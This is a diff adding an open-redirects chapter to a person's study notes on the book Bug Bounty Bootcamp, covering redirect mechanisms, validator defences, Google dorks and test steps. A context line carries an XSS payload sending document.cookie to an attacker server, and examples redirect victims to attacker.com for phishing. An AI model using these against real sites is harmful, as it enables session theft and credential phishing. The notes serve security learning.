@@ -11,6 +11,7 @@
   - [Scope Discovery](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#scope-discovery)
   - [Writing Your Own Recon Scripts](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#writing-your-own-recon-scripts)
 - [Chapter 6: Cross-Site Scripting](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#cross-site-scripting)
+- [Chapter 7: Open Redirects](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#chapter-7-open-redirects)
 
 ### Chapter 1: Picking a Bug Bounty Program
 
@@ -1318,3 +1319,97 @@ location='http://attacker_server_ip/c='+document.cookie;
 [Back to TOC](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#table-of-contents)
 
 ### Chapter 7: Open Redirects
+
+"Sites often use HTTP or URL parameters to redirect users to a specified URL without any user action. While this behavior can be useful, it can also cause _open redirects_, which happen when an attacker is able to manipulate the value of this parameter to redirect the user offsite."
+
+**Mechanisms**
+
+- Sites often redirect unauthenticated users to a login page when try to to access a page that requires authentication. After authentication, the user could then be redirected back to the specific page they were trying to access before authentication.
+  - To redirect them back to the page they were trying to access, the site needs to remember where they were trying to go.
+  - To do this, the site uses some sort of redirect URL parameter appended to the URL to keep track of the user's original location.
+  - ex: `https://example.com/login?redirect=https://example.com/dashboard` will redirect a user to `https://example.com/dashboard` after they authenticate on the login page.
+  - This is a very common functionality included on modern websites.
+  - An attacker could provide a user with a link like `https://example.com/login?redirect=http://attacker.com`
+    - The victim may see the familiar https://example.com and not notice that it's redirecting somewhere else. The malicious website attacker.com could then try to emulate the login page of the real website to phish for credentials.
+- Referer-based open redirects use the `referer` HTTP request header that browsers automatically include.
+  - Attackers can host a site that links to the victim site to set the referer header of the request using HTML like this:
+    ```
+    <html>
+    <a href="https://example.com/login">Click here to login to example.com<a/>
+    </html>
+    ```
+  - This uses a <a> tag that links the text in the tag to another location.
+  - "If example.com uses a referer-based redirect system, the user's browser would redirect to the attacker's site after the user visits example.com, because the browser visited example.com via the attacker's page."
+
+**Prevention**
+
+- "Sites often implement URL validators to ensure that the user-provided redirect URL points to a legitimate location. These validators use either a blocklist or an allow list."
+  - Blocklists check whether the redirect has indicators of a malicious redirect and blocks those that do.
+    - Known malicious hostnames or special URL characters that are often used in open-redirect attacks.
+  - Allowlists will check the hostname portion of the URL to ensure it matches their list of allowed hosts allowing those that do, and blocking those that don't.
+- Validators have a hard time identifying the hostname portion of the URL making open redirects a very common vulnerability.
+
+**Hunting for Open Redirects**
+
+Step 1: Look for Redirect Parameters
+
+- `https://example.com/login?redirect=https://example.com/dashboard`
+- `https://example.com/login?redir=https://example.com/dashboard`
+- `https://example.com/login?next=https://example.com/dashboard`
+- `https://example.com/login?next=/dashboard`
+- In your proxy, look for parameters that contain absolute or relative URLs.
+  - Absolute URLs are complete and contain all the components necessary to locate the resource it points to: `https://example.com/login`
+    - URL scheme, hostname, path to resource
+  - Relative URLs are concatenated with another URL by the server to be used: `https://example.com/login?next=dashboard`
+    - parameters to look for: redirect, redir, RelayState, next, u, n, forward.
+  - Record any parameters that seem to be used for redirect.
+  - Note pages that don't contain redirect parameters in the URL but still automatically redirect the user.
+    - These are possible referer-based open redirects.
+    - 3XX response codes like 301, and 302 indicate a redirect.
+
+Step 2: Use Google Dorks to Find Additional Redirect Parameters
+
+- `site:example.com`
+  - Look for pages that contain URLs in their URL parameters using `%3D` which is URL-encoded equals sign "=".
+    - `inurl:%3Dhttp site:example.com` to find things like: `https://example.com/login?next=https://example.com/dashboard`
+  - `%2F` is URL-encoded "/"
+    - `inurl:%3D%2F site:example.com` to find `https://example.com/login?n=/dashboard`
+  - Search for well known URL redirect parameters:
+    - `inurl:redir site:example.com`
+    - `inurl:redirect site:example.com`
+    - `inurl:redirecturi site:example.com`
+    - `inurl:redirect_uri site:example.com`
+    - `inurl:redirecturl site:example.com`
+    - `inurl:redirect_url site:example.com`
+    - `inurl:return site:example.com`
+    - `inurl:returnurl site:example.com`
+    - `inurl:relaystate site:example.com`
+    - `inurl:forward site:example.com`
+    - `inurl:forwardurl site:example.com`
+    - `inurl:forward_url site:example.com`
+    - `inurl:url site:example.com`
+    - `inurl:uri site:example.com`
+    - `inurl:dest site:example.com`
+    - `inurl:destination site:example.com`
+    - `inurl:next site:example.com`
+
+Step 3: Test for Parameter-Based Open Redirects
+
+- Insert a random hostname or hostname you own into the redirect parameters.
+- Some may redirect immediately, other may not redirect until you've successfully completed a user action (registration, login, or logout).
+  - For these, you will need a user account to test the functionality.
+- If they redirect to the hostname you've inserted, Bingo!
+
+Step 4: Test for Referer-Based Open Redirects
+
+- When you find a redirect that is not contained in a redirect URL parameter, host the following on a domain you own:
+  ```
+  <html>
+    <a href="https://example.com/login">Click on this link!</a>
+  </html>
+  ```
+  - Click the link on your domain to go to example.com and see if you are redirected automatically or after performing a user action.
+
+**Bypassing Open-Redirect Protection**
+
+[Back to TOC](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#table-of-contents)
